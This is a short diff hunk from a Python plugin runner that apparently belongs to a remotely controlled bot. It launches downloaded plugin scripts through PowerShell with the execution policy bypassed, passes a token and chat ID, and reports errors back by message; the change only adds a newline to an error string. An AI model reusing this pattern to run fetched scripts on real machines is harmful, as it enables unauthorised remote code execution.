@@ -26,7 +26,7 @@ class Plugin():
 				sub = subprocess.Popen(["powershell.exe","-ExecutionPolicy","Bypass","-File",filename,self.token, self.chat_id],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
 				output, error = sub.communicate()
 				if error:
-					self.Send_Message.Send("%E2%9C%96%EF%B8%8F Failed Execute Plugin\n\n%E2%9D%96 Error : " + error)
+					self.Send_Message.Send("%E2%9C%96%EF%B8%8F Failed Execute Plugin\n\n%E2%9D%96 Error : \n" + error)
 			elif self.plugins[self.plugin]["Extention"] == "Py":
 				self.Send_Message.Send("%F0%9F%93%8C Checking Modules...")
 				for i in req.text.split("\n"):
